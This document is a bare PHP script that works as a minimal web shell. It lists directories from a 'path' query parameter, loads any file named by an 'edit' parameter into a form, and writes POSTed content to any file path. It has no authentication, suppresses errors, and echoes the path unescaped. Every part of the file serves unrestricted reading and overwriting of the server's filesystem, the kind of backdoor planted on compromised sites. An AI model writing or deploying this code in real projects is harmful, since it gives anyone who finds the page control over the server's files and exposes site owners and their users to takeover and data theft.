<?php
error_reporting(0);
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$files = scandir($path);

echo "<h2>Path: $path</h2><ul>";
foreach ($files as $file) {
    $f = "$path/$file";
    if (is_dir($f)) {
        echo "<li>[<a href='?path=".urlencode($f)."'>$file</a>]</li>";
    } else {
        echo "<li>$file - <a href='?edit=".urlencode($f)."'>Edit</a></li>";
    }
}
echo "</ul>";

if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if (file_exists($f)) {
        echo "<h3>Editing: $f</h3>
        <form method='POST'>
        <textarea name='content' rows='20' cols='100'>".htmlspecialchars(file_get_contents($f))."</textarea><br>
        <input type='hidden' name='file' value='".htmlspecialchars($f)."'>
        <input type='submit' value='Save'>
        </form>";
    }
}

if (isset($_POST['content']) && isset($_POST['file'])) {
    file_put_contents($_POST['file'], $_POST['content']);
    echo "<p>Saved.</p><meta http-equiv='refresh' content='1;url=?path=".urlencode(dirname($_POST['file']))."'>";
}
?>